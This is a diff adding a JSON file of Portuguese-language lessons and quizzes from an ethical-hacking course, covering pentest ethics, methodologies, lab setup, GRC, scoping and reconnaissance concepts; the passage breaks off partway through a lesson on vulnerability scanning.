@@ -1,0 +1,4315 @@
+[
+  {
+    "filename": "1.0-introducao.html",
+    "module": "1",
+    "title": "Introdução ao Módulo 1.0",
+    "victory_msg": "FUNDAMENTOS INICIADOS!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-graduation-cap",
+        "title": "Objetivo do Módulo 1",
+        "content": "Este módulo introduz os <b>fundamentos do hacking ético</b> e dos testes de penetração. Você vai entender a importância da profissão, como ela funciona dentro da lei, e quais metodologias são usadas.",
+        "highlight": "Fundamento de tudo que virá a seguir"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-palette",
+        "title": "A Arte do Hacking",
+        "content": "O hacking é frequentemente visto como uma <b>arte</b>, mas para ser eficaz, essa arte deve ser guiada por uma <b>metodologia estruturada</b>. Sem método, um teste de penetração é apenas tentativa e erro.",
+        "highlight": "Arte + Método = Eficácia"
+      },
+      {
+        "type": "example",
+        "icon": "fa-building-shield",
+        "title": "Por que Empresas Contratam Pentesters",
+        "scenario": "Um e-commerce descobre que dados de clientes foram vazados. Eles contratam um pentester para simular o mesmo ataque e descobrir como o invasor entrou, corrigindo a brecha <b>antes</b> que aconteça novamente.",
+        "takeaway": "O pentester encontra e corrige falhas antes dos criminosos."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual o foco inicial para quem deseja entrar na cibersegurança ofensiva?",
+        "options": [
+          "Compreender conceitos principais e preparar um laboratório prático",
+          "Comprar o computador mais caro disponível",
+          "Tentar invadir servidores reais sem treinamento"
+        ],
+        "correctText": "Compreender conceitos principais e preparar um laboratório prático",
+        "explanation": "A base teórica aliada à prática em ambiente seguro (sandbox) é o caminho correto."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-scale-balanced",
+        "title": "Ético vs Antiético",
+        "content": "A diferença entre hacking ético e antiético <b>não está nas ferramentas</b> — ambos usam as mesmas. A diferença está na <b>intenção</b> e na <b>autorização</b>. Um hacker ético possui permissão formal (escopo) para testar.",
+        "highlight": "Mesmas ferramentas, intenções opostas"
+      },
+      {
+        "type": "fill",
+        "sentence": "O que diferencia um hacker ético de um criminoso é a ___ e a autorização formal do cliente.",
+        "options": [
+          "intenção",
+          "ferramenta",
+          "velocidade"
+        ],
+        "correctText": "intenção",
+        "explanation": "Ferramentas são as mesmas. A intenção de proteger é o que define o hacker ético."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-brain",
+        "title": "Motivação dos Atacantes",
+        "content": "As motivações vão desde <b>ganho financeiro</b> (ransomware), passando por <b>espionagem corporativa</b>, até <b>hacktivismo</b> (ativismo político digital). Conhecer essas motivações ajuda a antecipar ameaças.",
+        "highlight": "Conheça o inimigo para antecipar seus movimentos"
+      },
+      {
+        "type": "match",
+        "title": "Associe as Motivações",
+        "pairs": [
+          {
+            "term": "Ransomware",
+            "definition": "Ganho financeiro"
+          },
+          {
+            "term": "Hacktivismo",
+            "definition": "Ativismo político"
+          },
+          {
+            "term": "APT",
+            "definition": "Espionagem estatal"
+          }
+        ]
+      },
+      {
+        "type": "teach",
+        "icon": "fa-list-check",
+        "title": "Tipos de Testes",
+        "content": "Existem diversos <b>tipos de testes</b>: de <b>rede</b>, de <b>aplicações web</b>, de <b>engenharia social</b>, <b>físicos</b> e de <b>wireless</b>. Conhecê-los permite escolher a abordagem certa para cada cenário.",
+        "highlight": "Cada cenário exige um tipo de teste diferente"
+      },
+      {
+        "type": "quiz",
+        "task": "O que torna o hacking eficaz em vez de apenas uma 'arte casual'?",
+        "options": [
+          "O uso de uma metodologia organizada e sistemática",
+          "A sorte de encontrar um sistema sem senha",
+          "Baixar ferramentas aleatórias e executá-las"
+        ],
+        "correctText": "O uso de uma metodologia organizada e sistemática",
+        "explanation": "Metodologias garantem cobertura completa de todos os vetores de ataque."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-vial",
+        "title": "Prática Intensiva",
+        "content": "Hacking é um conceito <b>prático</b>. É necessário construir e explorar <b>laboratórios virtuais</b> para ganhar proficiência. Teoria sem prática jamais formará um profissional competente.",
+        "highlight": "Laboratório = campo de treino obrigatório"
+      },
+      {
+        "type": "fill",
+        "sentence": "Para fixar o aprendizado, a recomendação é construir um ___ e praticar os conceitos.",
+        "options": [
+          "laboratório virtual",
+          "blog pessoal",
+          "currículo online"
+        ],
+        "correctText": "laboratório virtual",
+        "explanation": "A prática real em ambiente controlado transforma o estudante em profissional."
+      }
+    ]
+  },
+  {
+    "filename": "1.1-hacking-etico.html",
+    "module": "1",
+    "title": "Hacking Ético 1.1",
+    "victory_msg": "HACKING ÉTICO DOMINADO!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-user-secret",
+        "title": "O que é um Hacker Ético?",
+        "content": "Um hacker ético (ou pentester) é um profissional de segurança que usa as <b>mesmas técnicas de atacantes reais</b> para encontrar vulnerabilidades, mas com <b>autorização formal</b> e com o objetivo de <b>proteger</b>.",
+        "highlight": "Mesmo arsenal, propósito oposto"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-magnifying-glass",
+        "title": "Teste de Penetração",
+        "content": "O processo de analisar a postura de segurança de uma infraestrutura, identificar e <b>explorar fraquezas</b>, e determinar se um comprometimento é possível é chamado de <b>Teste de Penetração (Pentest)</b>.",
+        "highlight": "Pentest = simulação controlada de ataque"
+      },
+      {
+        "type": "example",
+        "icon": "fa-briefcase",
+        "title": "O Mercado de Trabalho",
+        "scenario": "Sites como LinkedIn, Indeed e Glassdoor listam vagas para Penetration Tester, Red Team Operator e Security Analyst. As certificações mais procuradas são <b>CompTIA PenTest+</b>, <b>CEH</b> e <b>OSCP</b>.",
+        "takeaway": "A demanda por profissionais de segurança ofensiva cresce a cada ano."
+      },
+      {
+        "type": "quiz",
+        "task": "O que define um hacker ético?",
+        "options": [
+          "Usa técnicas de ataque com autorização para proteger sistemas",
+          "Invade sistemas por curiosidade sem avisar ninguém",
+          "Apenas configura firewalls e antivírus"
+        ],
+        "correctText": "Usa técnicas de ataque com autorização para proteger sistemas",
+        "explanation": "Autorização + intenção de proteger = hacking ético."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-masks-theater",
+        "title": "Atores de Ameaça",
+        "content": "Os <b>atores de ameaça</b> são classificados por motivação: <b>Script Kiddies</b> (amadores que usam ferramentas prontas), <b>Hacktivistas</b> (motivação política), <b>Crime Organizado</b> (lucro financeiro), e <b>APTs</b> (grupos estatais avançados).",
+        "highlight": "Conhecer o adversário é o primeiro passo da defesa"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-user-ninja",
+        "title": "Script Kiddies vs APTs",
+        "content": "<b>Script Kiddies</b> são amadores que usam ferramentas prontas sem entender como funcionam. Já os <b>APTs (Advanced Persistent Threats)</b> são grupos sofisticados, geralmente financiados por governos, que realizam ataques persistentes e furtivos.",
+        "highlight": "A diferença está na sofisticação e nos recursos"
+      },
+      {
+        "type": "match",
+        "title": "Classifique os Atores de Ameaça",
+        "pairs": [
+          {
+            "term": "Script Kiddie",
+            "definition": "Amador com ferramentas prontas"
+          },
+          {
+            "term": "Hacktivista",
+            "definition": "Motivação política/social"
+          },
+          {
+            "term": "APT",
+            "definition": "Grupo estatal sofisticado"
+          },
+          {
+            "term": "Crime Organizado",
+            "definition": "Motivação financeira"
+          }
+        ]
+      },
+      {
+        "type": "teach",
+        "icon": "fa-shield-halved",
+        "title": "Divulgação Responsável",
+        "content": "Um pesquisador de segurança que encontra vulnerabilidades deve divulgá-las de forma <b>responsável</b> ao fornecedor. Isso é chamado de <b>Responsible Disclosure</b>. Explorar ou vender a falha sem aviso é antiético e ilegal.",
+        "highlight": "Divulgação responsável salva milhões de usuários"
+      },
+      {
+        "type": "fill",
+        "sentence": "Quando um pesquisador encontra uma falha, ele deve fazer uma ___ ao fornecedor antes de publicar.",
+        "options": [
+          "divulgação responsável",
+          "exploração completa",
+          "venda na dark web"
+        ],
+        "correctText": "divulgação responsável",
+        "explanation": "Responsible Disclosure dá ao fornecedor tempo para corrigir antes da publicação."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual ator de ameaça é tipicamente financiado por um governo e realiza ataques persistentes?",
+        "options": [
+          "APT (Advanced Persistent Threat)",
+          "Script Kiddie",
+          "Hacktivista"
+        ],
+        "correctText": "APT (Advanced Persistent Threat)",
+        "explanation": "APTs são grupos sofisticados, geralmente estatais, que realizam ataques furtivos e de longa duração."
+      }
+    ]
+  },
+  {
+    "filename": "1.2-metodologias.html",
+    "module": "1",
+    "title": "Metodologias de Pentest 1.2",
+    "victory_msg": "METODOLOGIAS ASSIMILADAS!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-sitemap",
+        "title": "Por que Seguir uma Metodologia?",
+        "content": "Uma metodologia garante que o pentest seja <b>repetível</b>, <b>documentável</b> e cubra <b>todos os vetores de ataque</b>. Sem ela, áreas críticas podem ser ignoradas por acidente.",
+        "highlight": "Metodologia = cobertura completa"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-clipboard-list",
+        "title": "PTES (Penetration Testing Execution Standard)",
+        "content": "O <b>PTES</b> define 7 fases: Pré-engajamento, Coleta de Inteligência, Modelagem de Ameaças, Análise de Vulnerabilidades, Exploração, Pós-Exploração e Relatório.",
+        "highlight": "7 fases do início ao relatório"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-book",
+        "title": "OWASP Testing Guide",
+        "content": "O <b>OWASP Testing Guide</b> é focado em segurança de <b>aplicações web</b>. Ele cobre testes de autenticação, gerenciamento de sessão, validação de entrada, criptografia e lógica de negócios.",
+        "highlight": "O padrão para segurança web"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-network-wired",
+        "title": "NIST SP 800-115",
+        "content": "O <b>NIST SP 800-115</b> é um guia técnico do governo americano para condução de avaliações de segurança, incluindo revisão de documentos, análise de rede, scan de vulnerabilidades e testes de penetração.",
+        "highlight": "Padrão governamental de referência"
+      },
+      {
+        "type": "match",
+        "title": "Associe Metodologia → Foco",
+        "pairs": [
+          {
+            "term": "PTES",
+            "definition": "Pentest geral (7 fases)"
+          },
+          {
+            "term": "OWASP",
+            "definition": "Segurança de apps web"
+          },
+          {
+            "term": "NIST 800-115",
+            "definition": "Avaliações técnicas governamentais"
+          }
+        ]
+      },
+      {
+        "type": "teach",
+        "icon": "fa-flask",
+        "title": "Considerações Ambientais",
+        "content": "Antes de iniciar um teste, é crucial entender o <b>ambiente do alvo</b>: é uma rede interna ou externa? Há sistemas legados frágeis? Qual é a janela de manutenção? Tudo isso afeta a abordagem.",
+        "highlight": "O ambiente define a estratégia"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-eye",
+        "title": "Black Box, White Box, Grey Box",
+        "content": "<b>Black Box</b>: pentester não tem informação prévia. <b>White Box</b>: pentester tem acesso total (código-fonte, diagramas). <b>Grey Box</b>: pentester tem informação parcial (credenciais limitadas).",
+        "highlight": "Três níveis de informação, três abordagens"
+      },
+      {
+        "type": "quiz",
+        "task": "Em qual tipo de teste o pentester NÃO recebe nenhuma informação prévia sobre o alvo?",
+        "options": [
+          "Black Box",
+          "White Box",
+          "Grey Box"
+        ],
+        "correctText": "Black Box",
+        "explanation": "No Black Box, o pentester simula um atacante externo sem nenhum conhecimento interno."
+      },
+      {
+        "type": "fill",
+        "sentence": "O teste em que o pentester recebe acesso total ao código-fonte e diagramas é chamado de ___.",
+        "options": [
+          "White Box",
+          "Black Box",
+          "Grey Box"
+        ],
+        "correctText": "White Box",
+        "explanation": "White Box dá visibilidade completa para encontrar falhas em nível de código."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual metodologia define 7 fases desde o pré-engajamento até o relatório final?",
+        "options": [
+          "PTES",
+          "OWASP Testing Guide",
+          "NIST SP 800-115"
+        ],
+        "correctText": "PTES",
+        "explanation": "O PTES (Penetration Testing Execution Standard) organiza todo o pentest em 7 fases sequenciais."
+      }
+    ]
+  },
+  {
+    "filename": "1.3-laboratorio-proprio.html",
+    "module": "1",
+    "title": "Construindo seu Laboratório 1.3",
+    "victory_msg": "LABORATÓRIO CONFIGURADO!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-laptop-code",
+        "title": "Por que Ter um Laboratório?",
+        "content": "Um <b>laboratório de pentest</b> é um ambiente isolado onde você pode praticar técnicas ofensivas <b>sem riscos legais</b>. Nunca teste em sistemas reais sem autorização.",
+        "highlight": "Prática segura = evolução constante"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-server",
+        "title": "Requisitos de Hardware",
+        "content": "Você precisa de no mínimo <b>8GB de RAM</b> (16GB recomendado), processador com suporte a <b>virtualização</b> (VT-x/AMD-V), e espaço em disco suficiente para rodar 2+ VMs simultaneamente.",
+        "highlight": "Virtualização é a base do lab"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-download",
+        "title": "Ferramentas Essenciais do Lab",
+        "content": "As ferramentas base são: <b>VirtualBox</b> ou <b>VMware</b> como hipervisor, <b>Kali Linux</b> como SO ofensivo, e máquinas vulneráveis como <b>Metasploitable</b> e <b>DVWA</b> como alvos de prática.",
+        "highlight": "Kali Linux + alvos vulneráveis = treino completo"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "Implantando o Kali Linux",
+        "scenario": "Após instalar o VirtualBox, você importa a imagem OVA do Kali Linux. A VM vem pré-configurada com centenas de ferramentas de pentest prontas para uso.",
+        "code": "VBoxManage import kali-linux.ova",
+        "takeaway": "Uma VM Kali pode ser implantada em minutos com uma imagem pré-configurada."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual é a principal razão para usar um laboratório virtual em vez de sistemas reais?",
+        "options": [
+          "Evitar consequências legais e danos a sistemas em produção",
+          "Economizar dinheiro com licenças de software",
+          "Ter acesso a internet mais rápida"
+        ],
+        "correctText": "Evitar consequências legais e danos a sistemas em produção",
+        "explanation": "Testar em sistemas reais sem autorização é crime. O lab virtual é seguro e legal."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-triangle-exclamation",
+        "title": "E se Você Quebrar Algo?",
+        "content": "No laboratório virtual, <b>quebrar coisas é esperado</b>! Use <b>snapshots</b> (instantâneos) da VM antes de cada teste. Se algo der errado, basta restaurar o snapshot e voltar ao estado anterior.",
+        "highlight": "Snapshots = ctrl+Z do seu lab"
+      },
+      {
+        "type": "fill",
+        "sentence": "Para reverter danos em uma VM de laboratório, utilizamos o recurso de ___ do hipervisor.",
+        "options": [
+          "snapshots",
+          "firewall",
+          "antivírus"
+        ],
+        "correctText": "snapshots",
+        "explanation": "Snapshots salvam o estado exato da VM, permitindo restaurá-la instantaneamente."
+      },
+      {
+        "type": "match",
+        "title": "Associe Ferramenta → Papel no Lab",
+        "pairs": [
+          {
+            "term": "VirtualBox",
+            "definition": "Hipervisor (roda as VMs)"
+          },
+          {
+            "term": "Kali Linux",
+            "definition": "SO com ferramentas ofensivas"
+          },
+          {
+            "term": "Metasploitable",
+            "definition": "Alvo vulnerável para prática"
+          }
+        ]
+      },
+      {
+        "type": "quiz",
+        "task": "Qual SO é amplamente usado como plataforma ofensiva em pentest e já vem com ferramentas pré-instaladas?",
+        "options": [
+          "Kali Linux",
+          "Windows Server",
+          "Ubuntu Desktop"
+        ],
+        "correctText": "Kali Linux",
+        "explanation": "O Kali Linux é a distribuição padrão para pentest, com 600+ ferramentas pré-instaladas."
+      }
+    ]
+  },
+  {
+    "filename": "2.0-introducao.html",
+    "module": "2",
+    "title": "Introdução ao Módulo 2.0",
+    "victory_msg": "PLANEJAMENTO INICIADO!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-map",
+        "title": "Planejamento e Escopo",
+        "content": "Antes de atacar, todo pentester deve <b>planejar</b>. O módulo 2 cobre <b>governança</b>, <b>risco</b>, <b>conformidade (GRC)</b>, e como definir o <b>escopo</b> de um teste de penetração.",
+        "highlight": "Planejar antes de atacar"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-file-contract",
+        "title": "O Contrato é a Lei",
+        "content": "Tudo começa com um <b>contrato</b> (Statement of Work / Rules of Engagement). Ele define <b>o que pode ser testado</b>, em quais horários, e quais são os limites.",
+        "highlight": "Sem contrato = sem teste"
+      },
+      {
+        "type": "example",
+        "icon": "fa-handshake",
+        "title": "Rules of Engagement",
+        "scenario": "O cliente autoriza testes apenas na rede <b>10.0.0.0/24</b>, de segunda a sexta, das 22h às 6h. Qualquer atividade fora desse escopo é considerada <b>não autorizada</b>.",
+        "takeaway": "O ROE protege tanto o pentester quanto o cliente."
+      },
+      {
+        "type": "quiz",
+        "task": "O que define exatamente o que pode ser testado em um pentest?",
+        "options": [
+          "O contrato de escopo (Rules of Engagement)",
+          "A vontade do pentester",
+          "O orçamento disponível"
+        ],
+        "correctText": "O contrato de escopo (Rules of Engagement)",
+        "explanation": "O ROE é o documento legal que delimita o escopo, horários e limites do teste."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-shield-halved",
+        "title": "Governança, Risco e Conformidade",
+        "content": "<b>GRC</b> é a tríade que garante que as atividades de segurança estejam alinhadas com <b>regulamentações</b> (LGPD, GDPR, PCI-DSS), <b>políticas internas</b> e <b>gestão de riscos</b>.",
+        "highlight": "GRC = Governança + Risco + Conformidade"
+      },
+      {
+        "type": "match",
+        "title": "Associe os Conceitos GRC",
+        "pairs": [
+          {
+            "term": "Governança",
+            "definition": "Políticas e estrutura organizacional"
+          },
+          {
+            "term": "Risco",
+            "definition": "Probabilidade e impacto de ameaças"
+          },
+          {
+            "term": "Conformidade",
+            "definition": "Aderência a regulamentações (LGPD, PCI)"
+          }
+        ]
+      },
+      {
+        "type": "fill",
+        "sentence": "A tríade ___ garante que a segurança esteja alinhada com regulamentações e políticas.",
+        "options": [
+          "GRC",
+          "CIA",
+          "APT"
+        ],
+        "correctText": "GRC",
+        "explanation": "GRC = Governança, Risco e Conformidade."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual regulamentação protege dados pessoais de cidadãos brasileiros?",
+        "options": [
+          "LGPD",
+          "PCI-DSS",
+          "HIPAA"
+        ],
+        "correctText": "LGPD",
+        "explanation": "A LGPD (Lei Geral de Proteção de Dados) é a lei brasileira equivalente à GDPR europeia."
+      }
+    ]
+  },
+  {
+    "filename": "2.1-governanca-grc.html",
+    "module": "2",
+    "title": "Governança e GRC 2.1",
+    "victory_msg": "GRC DOMINADO!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-landmark",
+        "title": "Frameworks de Governança",
+        "content": "Frameworks como <b>NIST CSF</b>, <b>ISO 27001</b> e <b>COBIT</b> fornecem estruturas para implementar governança de segurança de forma organizada.",
+        "highlight": "Frameworks = receita para governança"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-balance-scale",
+        "title": "Gestão de Riscos",
+        "content": "A gestão de riscos envolve <b>identificar</b>, <b>avaliar</b> e <b>mitigar</b> ameaças. Riscos são calculados como <b>Probabilidade × Impacto</b>. Nem todo risco precisa ser eliminado — alguns são aceitos.",
+        "highlight": "Risco = Probabilidade × Impacto"
+      },
+      {
+        "type": "example",
+        "icon": "fa-chart-line",
+        "title": "Matriz de Risco",
+        "scenario": "Uma vulnerabilidade de SQL Injection em um servidor exposto à internet tem <b>alta probabilidade</b> de exploração e <b>alto impacto</b> (acesso ao banco de dados). Classificação: <b>Risco Crítico</b>.",
+        "takeaway": "Riscos críticos exigem correção imediata."
+      },
+      {
+        "type": "quiz",
+        "task": "Como é calculado o nível de um risco?",
+        "options": [
+          "Probabilidade × Impacto",
+          "Número de firewalls × Custo",
+          "Velocidade da rede ÷ Número de servidores"
+        ],
+        "correctText": "Probabilidade × Impacto",
+        "explanation": "A fórmula padrão combina a chance de ocorrer com o dano potencial."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-file-shield",
+        "title": "Conformidade Regulatória",
+        "content": "<b>PCI-DSS</b> protege dados de cartões de crédito. <b>HIPAA</b> protege dados de saúde. <b>LGPD/GDPR</b> protege dados pessoais. O pentester deve conhecer qual regulamentação se aplica ao cliente.",
+        "highlight": "Cada setor tem sua regulamentação"
+      },
+      {
+        "type": "match",
+        "title": "Regulamentação → Proteção",
+        "pairs": [
+          {
+            "term": "PCI-DSS",
+            "definition": "Dados de cartões de crédito"
+          },
+          {
+            "term": "HIPAA",
+            "definition": "Dados de saúde"
+          },
+          {
+            "term": "LGPD/GDPR",
+            "definition": "Dados pessoais"
+          }
+        ]
+      },
+      {
+        "type": "teach",
+        "icon": "fa-exclamation-triangle",
+        "title": "Tipos de Risco",
+        "content": "<b>Risco Inerente</b>: risco antes de qualquer controle. <b>Risco Residual</b>: risco que permanece após aplicar controles. <b>Apetite de Risco</b>: nível de risco que a organização está disposta a aceitar.",
+        "highlight": "Nenhum sistema é 100% seguro"
+      },
+      {
+        "type": "fill",
+        "sentence": "O risco que permanece mesmo após aplicar controles de segurança é chamado de Risco ___.",
+        "options": [
+          "Residual",
+          "Inerente",
+          "Absoluto"
+        ],
+        "correctText": "Residual",
+        "explanation": "Risco Residual é o que sobra depois de mitigar. Risco Inerente é antes de qualquer controle."
+      }
+    ]
+  },
+  {
+    "filename": "2.2-escopo-necessidades.html",
+    "module": "2",
+    "title": "Escopo e Necessidades 2.2",
+    "victory_msg": "ESCOPO DEFINIDO!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-crosshairs",
+        "title": "Definindo o Escopo",
+        "content": "O <b>escopo</b> define os limites exatos do teste: quais <b>IPs</b>, <b>domínios</b>, <b>aplicações</b> e <b>redes</b> podem ser testados. Tudo fora do escopo é proibido.",
+        "highlight": "Escopo = Limites absolutos do teste"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-clock",
+        "title": "Janela de Teste",
+        "content": "O cliente define <b>quando</b> os testes podem ocorrer. Testes em horário de produção podem causar <b>interrupções</b>. A janela de manutenção é o período mais seguro.",
+        "highlight": "Horário errado = risco de indisponibilidade"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-users",
+        "title": "Stakeholders",
+        "content": "Os <b>stakeholders</b> são as pessoas envolvidas no pentest: o <b>patrocinador</b> (quem paga), o <b>ponto de contato técnico</b> (quem ajuda), e a <b>equipe jurídica</b> (quem valida o contrato).",
+        "highlight": "Comunicação com stakeholders é essencial"
+      },
+      {
+        "type": "quiz",
+        "task": "O que acontece se o pentester testar um sistema FORA do escopo autorizado?",
+        "options": [
+          "É considerado acesso não autorizado (crime)",
+          "Nada, pois ele tem boas intenções",
+          "Ele ganha bônus por encontrar mais falhas"
+        ],
+        "correctText": "É considerado acesso não autorizado (crime)",
+        "explanation": "Testar fora do escopo é crime, independentemente da intenção."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-file-lines",
+        "title": "Statement of Work (SOW)",
+        "content": "O <b>SOW</b> é o documento que detalha: <b>objetivos</b> do teste, <b>metodologia</b>, <b>entregáveis</b> (relatório), <b>cronograma</b> e <b>custo</b>. É o contrato comercial do pentest.",
+        "highlight": "SOW = contrato comercial detalhado"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-gavel",
+        "title": "Get Out of Jail Free Letter",
+        "content": "A <b>carta de autorização</b> é o documento que protege o pentester legalmente. Ela prova que o teste foi autorizado pelo proprietário do sistema.",
+        "highlight": "Sem carta = sem proteção legal"
+      },
+      {
+        "type": "fill",
+        "sentence": "O documento que protege o pentester legalmente durante o teste é a ___.",
+        "options": [
+          "carta de autorização",
+          "nota fiscal",
+          "certidão digital"
+        ],
+        "correctText": "carta de autorização",
+        "explanation": "A 'Get Out of Jail Free Letter' prova que o teste foi formalmente autorizado."
+      },
+      {
+        "type": "match",
+        "title": "Documentos do Pentest",
+        "pairs": [
+          {
+            "term": "SOW",
+            "definition": "Contrato comercial com objetivos e custo"
+          },
+          {
+            "term": "ROE",
+            "definition": "Regras e limites do teste"
+          },
+          {
+            "term": "Carta de Autorização",
+            "definition": "Proteção legal do pentester"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "filename": "2.3-mentalidade-etica.html",
+    "module": "2",
+    "title": "Mentalidade Ética 2.3",
+    "victory_msg": "ÉTICA PROFISSIONAL CONSOLIDADA!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-user-shield",
+        "title": "Profissionalismo",
+        "content": "O pentester deve manter <b>confidencialidade</b> absoluta sobre as vulnerabilidades encontradas. Vazar informações do cliente é uma violação ética e legal gravíssima.",
+        "highlight": "Confidencialidade = regra número 1"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-lock",
+        "title": "NDA (Non-Disclosure Agreement)",
+        "content": "O <b>NDA</b> é o acordo de confidencialidade assinado antes do teste. Ele obriga o pentester a não divulgar <b>nenhuma informação</b> sobre o cliente, suas vulnerabilidades ou seus dados.",
+        "highlight": "NDA protege o cliente e o pentester"
+      },
+      {
+        "type": "example",
+        "icon": "fa-ban",
+        "title": "O que NÃO Fazer",
+        "scenario": "Durante um pentest, você encontra dados pessoais de funcionários no servidor. Você <b>NÃO</b> pode copiar esses dados para seu computador pessoal, compartilhá-los ou usá-los fora do escopo.",
+        "takeaway": "Dados encontrados pertencem ao cliente. Nunca extraia ou compartilhe."
+      },
+      {
+        "type": "quiz",
+        "task": "O que é um NDA no contexto de um pentest?",
+        "options": [
+          "Acordo de confidencialidade sobre as informações do cliente",
+          "Ferramenta de scan de vulnerabilidades",
+          "Tipo de ataque de engenharia social"
+        ],
+        "correctText": "Acordo de confidencialidade sobre as informações do cliente",
+        "explanation": "NDA = Non-Disclosure Agreement, obriga sigilo sobre tudo que for encontrado."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-handshake-angle",
+        "title": "Integridade e Limites",
+        "content": "Nunca exceda o escopo, mesmo que encontre algo interessante fora dele. Nunca instale <b>backdoors permanentes</b>. Nunca use o acesso obtido para benefício pessoal.",
+        "highlight": "Integridade acima de tudo"
+      },
+      {
+        "type": "fill",
+        "sentence": "O acordo que obriga o pentester a não divulgar informações do cliente é o ___.",
+        "options": [
+          "NDA",
+          "SOW",
+          "CVE"
+        ],
+        "correctText": "NDA",
+        "explanation": "NDA = Non-Disclosure Agreement, o acordo de sigilo."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-certificate",
+        "title": "Código de Ética",
+        "content": "Certificações como <b>CEH</b> e <b>OSCP</b> possuem códigos de ética que o profissional deve seguir. Violá-los pode resultar em <b>revogação da certificação</b> e danos à reputação.",
+        "highlight": "Certificação + Ética = Credibilidade"
+      },
+      {
+        "type": "quiz",
+        "task": "O que pode acontecer se um pentester certificado violar o código de ética?",
+        "options": [
+          "Revogação da certificação e danos à reputação",
+          "Nada, pois certificações não têm regras éticas",
+          "Ele recebe uma nova certificação automaticamente"
+        ],
+        "correctText": "Revogação da certificação e danos à reputação",
+        "explanation": "Certificações possuem códigos de conduta rigorosos que devem ser seguidos."
+      }
+    ]
+  },
+  {
+    "filename": "3.0-introducao.html",
+    "module": "3",
+    "title": "Introdução ao Módulo 3.0",
+    "victory_msg": "RECONHECIMENTO INICIADO!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-binoculars",
+        "title": "Coleta de Informações",
+        "content": "Antes de atacar, o pentester precisa <b>conhecer o alvo</b>. Este módulo cobre <b>reconhecimento passivo</b> (sem tocar no alvo), <b>reconhecimento ativo</b> (interagindo com o alvo) e <b>varredura de vulnerabilidades</b>.",
+        "highlight": "Informação é a arma mais poderosa"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-eye-slash",
+        "title": "Passivo vs Ativo",
+        "content": "<b>Reconhecimento passivo</b>: coletar informações sem interagir diretamente com o alvo (OSINT, Google, WHOIS). <b>Reconhecimento ativo</b>: interagir diretamente com o alvo (port scan, banner grabbing).",
+        "highlight": "Passivo = invisível. Ativo = detectável."
+      },
+      {
+        "type": "example",
+        "icon": "fa-magnifying-glass",
+        "title": "OSINT na Prática",
+        "scenario": "Usando apenas o Google e LinkedIn, você descobre que a empresa alvo usa <b>Apache 2.4</b>, <b>WordPress</b> e que o admin se chama <b>João Silva</b>. Tudo sem enviar um único pacote ao servidor.",
+        "takeaway": "OSINT revela informações críticas sem alertar o alvo."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual tipo de reconhecimento NÃO interage diretamente com o alvo?",
+        "options": [
+          "Reconhecimento passivo",
+          "Reconhecimento ativo",
+          "Varredura de portas"
+        ],
+        "correctText": "Reconhecimento passivo",
+        "explanation": "Passivo usa fontes públicas (OSINT). Ativo envia pacotes ao alvo."
+      },
+      {
+        "type": "match",
+        "title": "Classifique as Técnicas",
+        "pairs": [
+          {
+            "term": "Google Dorking",
+            "definition": "Reconhecimento passivo"
+          },
+          {
+            "term": "Nmap port scan",
+            "definition": "Reconhecimento ativo"
+          },
+          {
+            "term": "WHOIS lookup",
+            "definition": "Reconhecimento passivo"
+          }
+        ]
+      },
+      {
+        "type": "fill",
+        "sentence": "A técnica de coletar informações usando fontes públicas sem tocar no alvo é chamada de ___.",
+        "options": [
+          "OSINT",
+          "Exploit",
+          "Phishing"
+        ],
+        "correctText": "OSINT",
+        "explanation": "OSINT = Open Source Intelligence, inteligência de fontes abertas."
+      }
+    ]
+  },
+  {
+    "filename": "3.3-varredura-vulnerabilidade.html",
+    "module": "3",
+    "title": "Varredura de Vulnerabilidades 3.3",
+    "victory_msg": "SCANNER DE VULNS DOMINADO!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-bug",
+        "title": "O que é Varredura de Vulnerabilidades?",
+        "content": "A varredura automatizada compara os serviços encontrados contra um <b>banco de dados de vulnerabilidades conhecidas</b> (CVEs). Ferramentas como <b>Nessus</b>, <b>OpenVAS</b> e <b>Qualys</b> automatizam este processo.",
+        "highlight": "Scanner = detecção automatizada em massa"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-database",
+        "title": "CVE e CVSS",
